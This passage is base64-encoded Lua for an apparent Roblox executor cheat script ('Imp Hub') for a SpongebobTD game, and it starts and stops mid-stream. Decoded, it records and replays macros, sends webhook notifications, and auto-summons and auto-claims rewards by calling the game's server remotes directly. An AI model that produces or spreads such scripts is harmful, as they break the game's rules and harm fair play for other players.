WNybyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZXNbaV0gPSBpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlZmlsZSgiSW1wIEh1YiIgLi4gIi9TcG9uZ2Vib2JURC9NYWNyb3MvU2F2ZWRNYWNyb3MuanNvbiIsIEh0dHA6SlNPTkVuY29kZShGaWxlcykpCiAgICAgICAgICAgICAgICAgICAgICAgIG1hY3JvZHJvcDpTZXRWYWx1ZXMoRmlsZXMpCiAgICAgICAgICAgICAgICAgICAgICAgIEZsdWVudDpOb3RpZnkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGl0bGUgPSAiSW1wIEh1YiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9ICJNYWNybyBEZWxldGVkIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJDb250ZW50ID0gIlN1Y2Nlc3NmdWxseSBEZWxldGVkOiAiIC4uIG1hY3JvLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgKQogICAgICAgIGVuZAogICAgfQopCgpUYWJzLk1haW46QWRkQnV0dG9uKAogICAgewogICAgICAgIFRpdGxlID0gIlJlZnJlc2ggRmlsZXMiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIHBjYWxsKAogICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIHRhYmxlLmNsZWFyKEZpbGVzKQogICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKEh0dHA6SlNPTkRlY29kZShyZWFkZmlsZSgiSW1wIEh1YiIgLi4gIi9TcG9uZ2Vib2JURC9NYWNyb3MvU2F2ZWRNYWNyb3MuanNvbiIpKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KEZpbGVzLCBpKQogICAgICAgICAgICAgICAgICAgICAgICBtYWNyb2Ryb3A6U2V0VmFsdWVzKEZpbGVzKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICkKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5NYWluOkFkZEJ1dHRvbigKICAgIHsKICAgICAgICBUaXRsZSA9ICJDb3B5IE1hY3JvIEpTT04gU3RyaW5nIiwKICAgICAgICBEZXNjcmlwdGlvbiA9ICItIFdpbGwgQ29weSBNYWNybyBKU09OLCBXb3JrcyBGb3IgU2hhcmluZyBJdCBPbiBEaXNjb3JkIFNlcnZlciAoaHR0cHM6Ly9kc2MuZ2cvaW1waHViKSIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIHN1Y2MsIGVyciA9CiAgICAgICAgICAgICAgICBwY2FsbCgKICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBzZXRjbGlwYm9hcmQodG9zdHJpbmcocmVhZGZpbGUoIkltcCBIdWIiIC4uICIvU3BvbmdlYm9iVEQvIiAuLiBtYWNybykpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICkKCiAgICAgICAgICAgIGlmIHN1Y2MgdGhlbgogICAgICAgICAgICAgICAgRmx1ZW50Ok5vdGlmeSgKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlID0gIkltcCBIdWIiLAogICAgICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gIlN1Y2Nlc3NmdWxseSBDb3BpZWQgU2VsZWN0ZWQgTWFjcm8gSlNPTiBTdHJpbmciLAogICAgICAgICAgICAgICAgICAgICAgICBTdWJDb250ZW50ID0gIkNvcGllZCBUbyBDbGlwYm9hcmQiLAogICAgICAgICAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVsc2VpZiBlcnIgdGhlbgogICAgICAgICAgICAgICAgRmx1ZW50Ok5vdGlmeSgKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlID0gIkltcCBIdWIiLAogICAgICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gIkVycm9yIENvcHlpbmcgU2VsZWN0ZWQgTWFjcm8gSlNPTiBTdHJpbmciLAogICAgICAgICAgICAgICAgICAgICAgICBTdWJDb250ZW50ID0gIkVycm9yIiwKICAgICAgICAgICAgICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5NYWluOkFkZElucHV0KAogICAgIlNldHRpbmdNYWNybyIsCiAgICB7CiAgICAgICAgVGl0bGUgPSAiTWFjcm8gTmFtZSIsCiAgICAgICAgRGVmYXVsdCA9ICIiLAogICAgICAgIFBsYWNlaG9sZGVyID0gIk1hY3JvIE5hbWUgSGVyZSIsCiAgICAgICAgTnVtZXJpYyA9IGZhbHNlLAogICAgICAgIEZpbmlzaGVkID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBtYWNyb3RvcmVjb3JkID0gdAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLk1haW46QWRkU2VjdGlvbigiU3RhcnQgTWFjcm8g8J+UpyIpCgpUYWJzLk1haW46QWRkVG9nZ2xlKAogICAgIlJlY29yZGluZ01hY3JvIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJTdGFydCBSZWNvcmRpbmciLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBTdGFydCBSZWNvcmRpbmcgVGhlIEFjdGlvbnMiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIFJlY29yZGluZyA9IHQKCiAgICAgICAgICAgIHBjYWxsKAogICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGlmIFJlY29yZGluZyB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIEZsdWVudDpOb3RpZnkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGl0bGUgPSAiSW1wIEh1YiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9ICJTdGFydGVkIFJlY29yZGluZyBNYWNybyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViQ29udGVudCA9ICIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIFJlY29yZGluZyA9PSBmYWxzZSBhbmQgbWFjcm90b3JlY29yZCA9PSAiIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIEZsdWVudDpOb3RpZnkoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGl0bGUgPSAiSW1wIEh1YiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9ICJNYWNybyBOYW1lIFdhcyBOb3QgU2V0IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJDb250ZW50ID0gIlBsZWFzZSBSZWNvcmQgQWdhaW4gV2l0aCBBIFNldCBOYW1lLiIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRHVyYXRpb24gPSAxMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIFJlY29yZGluZyA9PSBmYWxzZSBhbmQgTWFjcm9zW21hY3JvdG9yZWNvcmRdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgRmx1ZW50Ok5vdGlmeSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJJbXAgSHViIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gIlRoaXMgTmFtZSBXYXMgQWxyZWFkeSBTZXQgSW4gVGhlIEZpbGUiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN1YkNvbnRlbnQgPSAiUmVjb3JkIEFnYWluIFdpdGggTmV3IE5hbWUuIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDE1CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgUmVjb3JkaW5nID09IGZhbHNlIGFuZCBub3QgTWFjcm9zW21hY3JvdG9yZWNvcmRdIGFuZCBtYWNyb3RvcmVjb3JkIH49ICIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgTWFjcm9zW21hY3JvdG9yZWNvcmRdID0gbWFjcm90b3JlY29yZAogICAgICAgICAgICAgICAgICAgICAgICB3cml0ZWZpbGUoIkltcCBIdWIiIC4uICIvU3BvbmdlYm9iVEQvTWFjcm9zL1NhdmVkTWFjcm9zLmpzb24iLCBIdHRwOkpTT05FbmNvZGUoTWFjcm9zKSkKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIldyaXRlZCAvIFJld3JpdGVkIFNhdmVkIE1hY3JvcyBGaWxlIikKICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVmaWxlKCJJbXAgSHViIiAuLiAiL1Nwb25nZWJvYlRELyIgLi4gbWFjcm90b3JlY29yZCwgSHR0cDpKU09ORW5jb2RlKEN1cnJlbnRNYWNybykpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJTYXZlZCBGaWxlIikKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgICAgICAgICAgTWFjcm9zID0gSHR0cDpKU09ORGVjb2RlKHJlYWRmaWxlKCJJbXAgSHViIiAuLiAiL1Nwb25nZWJvYlREL01hY3Jvcy9TYXZlZE1hY3Jvcy5qc29uIikpCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJVcGRhdGVkIE1hY3JvcyIpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjQpCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmNsZWFyKEZpbGVzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpLCB2IGluIHBhaXJzKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIdHRwOkpTT05EZWNvZGUocmVhZGZpbGUoIkltcCBIdWIiIC4uICIvU3BvbmdlYm9iVEQvTWFjcm9zL1NhdmVkTWFjcm9zLmpzb24iKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmluc2VydChGaWxlcywgaSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbWFjcm9kcm9wOlNldFZhbHVlcyhGaWxlcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCgiQ2xlYXJlZCBGaWxlcyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgICAgICBGbHVlbnQ6Tm90aWZ5KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlID0gIlN1Y2Nlc3NmdWxseSBTYXZlZCBNYWNybzoiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnRlbnQgPSBtYWNyb3RvcmVjb3JkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN1YkNvbnRlbnQgPSAiQWRkZWQgTWFjcm8gVG8gU2F2ZWQgTWFjcm9zIEZpbGUuIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICB0YWJsZS5jbGVhcihDdXJyZW50TWFjcm8pCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgKQogICAgICAgIGVuZAogICAgfQopCgpUYWJzLk1haW46QWRkVG9nZ2xlKAogICAgIlJlcGxheU1hY3JvIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJSZXBsYXkgTWFjcm8iLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBSZXBsYXkgQWxsIFNhdmVkIEFjdGlvbnMgRnJvbSBTZWxlY3RlZCBNYWNybyIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgUmVwbGF5ID0gdAogICAgICAgICAgICBpZiBSZXBsYXkgYW5kIG1hY3JvIHRoZW4KICAgICAgICAgICAgICAgIEZsdWVudDpOb3RpZnkoCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJTdGFydGVkIFJlcGxheWluZyBNYWNybzogIiwKICAgICAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9IG1hY3JvLAogICAgICAgICAgICAgICAgICAgICAgICBTdWJDb250ZW50ID0gIiIsCiAgICAgICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIENvbXBsZXRlZEFjdGlvbnMgPSB7fQogICAgICAgICAgICAgICAgQWN0aW9uc0NvbXBsZXRlZCA9IDAKICAgICAgICAgICAgICAgIHdoaWxlIFJlcGxheSBkbwogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlcGxheU1hY3JvKG1hY3JvKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZWlmIFJlcGxheSBhbmQgbm90IG1hY3JvIHRoZW4KICAgICAgICAgICAgICAgIEZsdWVudDpOb3RpZnkoCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJJbXAgSHViIiwKICAgICAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9ICJObyBNYWNybyBTZWxlY3RlZC4iLAogICAgICAgICAgICAgICAgICAgICAgICBTdWJDb250ZW50ID0gIiIsCiAgICAgICAgICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMTEKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLldlYmhvb2s6QWRkU2VjdGlvbigiU2VuZCBXZWJob29rcyDwn5OyIikKClRhYnMuV2ViaG9vazpBZGRJbnB1dCgKICAgICJ1cmwiLAogICAgewogICAgICAgIFRpdGxlID0gIldlYmhvb2sgVVJMIiwKICAgICAgICBEZWZhdWx0ID0gIiIsCiAgICAgICAgUGxhY2Vob2xkZXIgPSAiLi4uIiwKICAgICAgICBOdW1lcmljID0gZmFsc2UsCiAgICAgICAgRmluaXNoZWQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIHVybCA9IHQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5XZWJob29rOkFkZFRvZ2dsZSgKICAgICJzZW5kb25yZXN1bHQiLAogICAgewogICAgICAgIFRpdGxlID0gIlNlbmQgTm90aWZ5IE9uIFZpY3RvcnkiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgc2VuZG9ucmVzdWx0ID0gdAogICAgICAgICAgICBpZiBzZW5kb25yZXN1bHQgdGhlbgogICAgICAgICAgICAgICAgRmx1ZW50Ok5vdGlmeSgKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRpdGxlID0gIkltcCBIdWIiLAogICAgICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gIldlYmhvb2sgRmVhdHVyZXMgSGFzIEJlZW4gRW5hYmxlZCIsCiAgICAgICAgICAgICAgICAgICAgICAgIFN1YkNvbnRlbnQgPSAiV2UgV2lsbCBOb3RpZnkgWW91IFdoZW4gVGhlIEdhbWUgSXMgRmluaXNoZWQg4pyFIiwKICAgICAgICAgICAgICAgICAgICAgICAgRHVyYXRpb24gPSA1CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5XZWJob29rOkFkZFRvZ2dsZSgKICAgICJhbGxvd2V2ZXIiLAogICAgewogICAgICAgIFRpdGxlID0gIkFsbG93IFBpbmcgRXZlcnlvbmUiLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gSWYgWW91IFdhbnQgVG8gR2V0IFBpbmdlZCBFdmVyeSBGaW5pc2hlZCBHYW1lIFdpdGggV2ViaG9va3MgRW5hYmxlZCIsCiAgICAgICAgRGVmYXVsdCA9IGZhbHNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odCkKICAgICAgICAgICAgYWxsb3dldmVyID0gdAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLlN1bW1vbjpBZGRTZWN0aW9uKCJTdW1tb25pbmcg8J+bkiIpCgpUYWJzLlN1bW1vbjpBZGREcm9wZG93bigKICAgICJzdW1tb25hbW8iLAogICAgewogICAgICAgIFRpdGxlID0gIlN1bW1vbiBBbW91bnQiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgVmFsdWVzID0gezEsIDEwfSwKICAgICAgICBNdWx0aSA9IGZhbHNlLAogICAgICAgIERlZmF1bHQgPSAiIiwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIHN1bW1vbmFtbyA9IHQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5TdW1tb246QWRkRHJvcGRvd24oCiAgICAiYmFubmVyIiwKICAgIHsKICAgICAgICBUaXRsZSA9ICJCYW5uZXIiLAogICAgICAgIERlc2NyaXB0aW9uID0gIiIsCiAgICAgICAgVmFsdWVzID0geyJTdGFuZGFyZCIsICJMaW1pdGVkIn0sCiAgICAgICAgTXVsdGkgPSBmYWxzZSwKICAgICAgICBEZWZhdWx0ID0gIiIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBiYW5uZXIgPSB0CiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuU3VtbW9uOkFkZFRvZ2dsZSgKICAgICJzdW1tb24iLAogICAgewogICAgICAgIFRpdGxlID0gIkF1dG9tYXRpYyBTdW1tb24iLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBBdXRvIEJ1eSBTdW1tb24iLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIHN1bW1vbiA9IHQKICAgICAgICAgICAgd2hpbGUgc3VtbW9uIGRvCiAgICAgICAgICAgICAgICBpZiBzdW1tb25hbW8gYW5kIGJhbm5lciB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgYmFubmVyLAogICAgICAgICAgICAgICAgICAgICAgICBzdW1tb25hbW8KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoIl9JbmRleCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgInNsZWl0bmlja19rbml0QDEuNy4wIgogICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJrbml0Iik6V2FpdEZvckNoaWxkKCJTZXJ2aWNlcyIpOldhaXRGb3JDaGlsZCgiVW5pdFNlcnZpY2UiKTpXYWl0Rm9yQ2hpbGQoIlJGIik6V2FpdEZvckNoaWxkKAogICAgICAgICAgICAgICAgICAgICAgICAiU3VtbW9uVW5pdHMiCiAgICAgICAgICAgICAgICAgICAgKTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfQopCgpUYWJzLlN1bW1vbjpBZGRUb2dnbGUoCiAgICAic2tpcCIsCiAgICB7CiAgICAgICAgVGl0bGUgPSAiU2tpcCBBbmltYXRpb24iLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBCZSBBdXRvIFNraXBwaW5nIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBza2lwID0gdAogICAgICAgICAgICB3aGlsZSBza2lwIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgcGNhbGwoCiAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICBWVTpCdXR0b24xRG93bihWZWN0b3IyLm5ldyg1MCwgOTApKQogICAgICAgICAgICAgICAgICAgICAgICBWVTpCdXR0b24xVXAoVmVjdG9yMi5uZXcoMTI4LCAxMDIpKQoKICAgICAgICAgICAgICAgICAgICAgICAgVklNOlNlbmRLZXlFdmVudCh0cnVlLCAxMywgZmFsc2UsIGdhbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjMpCiAgICAgICAgICAgICAgICAgICAgICAgIFZJTTpTZW5kS2V5RXZlbnQoZmFsc2UsIDEzLCBmYWxzZSwgZ2FtZSkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9CikKClRhYnMuTG9iYnk6QWRkU2VjdGlvbigiQ2xhaW0g8J+TqyIpCgpUYWJzLkxvYmJ5OkFkZFRvZ2dsZSgKICAgICJjbGFpbWNxdWVzdHMiLAogICAgewogICAgICAgIFRpdGxlID0gIkF1dG9tYXRpYyBDbGFpbSBDaGFyYWN0ZXJzIEFjaGlldmVtZW50cyIsCiAgICAgICAgRGVzY3JpcHRpb24gPSAiLSBXaWxsIEF1dG8gQ2xhaW0gQWxsIENoYXJhY3RlcnMgUXVlc3RzIChQYXRyaWNrLCBTcG9uZ2Vib2IsIEV0Yy4uLikiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHQpCiAgICAgICAgICAgIGNsYWltY3F1ZXN0cyA9IHQKICAgICAgICAgICAgd2hpbGUgY2xhaW1jcXVlc3RzIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoNSkKICAgICAgICAgICAgICAgIHBjYWxsKAogICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGksIHYgaW4gaXBhaXJzKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuUGxheWVyR3VpLkFjaGlldmVtZW50cy5NYWluLkNvbnRlbnQuUmlnaHQ6R2V0Q2hpbGRyZW4oCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICAgICApIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2OklzQSgiRnJhbWUiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGkyLCB2MiBpbiBpcGFpcnModjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2MjpJc0EoIkZyYW1lIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWNoaWV2ZW1lbnRzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFN1YkNhdGVnb3J5ID0gdi5OYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gdjIuTmFtZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2F0ZWdvcnkgPSAiVW5pdHMiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUGFja2FnZXMiKTpXYWl0Rm9yQ2hpbGQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIl9JbmRleCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk6V2FpdEZvckNoaWxkKCJzbGVpdG5pY2tfa25pdEAxLjcuMCIpOldhaXRGb3JDaGlsZCgia25pdCIpOldhaXRGb3JDaGlsZCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiU2VydmljZXMiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOldhaXRGb3JDaGlsZCgiUHJvZ3Jlc3Npb25TZXJ2aWNlIik6V2FpdEZvckNoaWxkKCJSRiIpOldhaXRGb3JDaGlsZCgiQ2xhaW0iKTpJbnZva2VTZXJ2ZXIoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW5wYWNrKGFyZ3MpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0KKQoKVGFicy5Mb2JieTpBZGRUb2dnbGUoCiAgICAicGFzcyIsCiAgICB7CiAgICAgICAgVGl0bGUgPSAiQXV0b21hdGljIENsYWltIFBhc3MiLAogICAgICAgIERlc2NyaXB0aW9uID0gIi0gV2lsbCBDbGFpbSBBbGwgUGFzcyBSZXdhcmRzIiwKICAgICAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0KQogICAgICAgICAgICBwYXNzID0gdAogICAgICAgICAgICB3aGlsZSBwYXNzIGRvCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoNikKICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlBhY2thZ2VzIik6V2FpdEZvckNoaWxkKCJfSW5kZXgiKTpXYWl0Rm9yQ2hpbGQoCiAgIC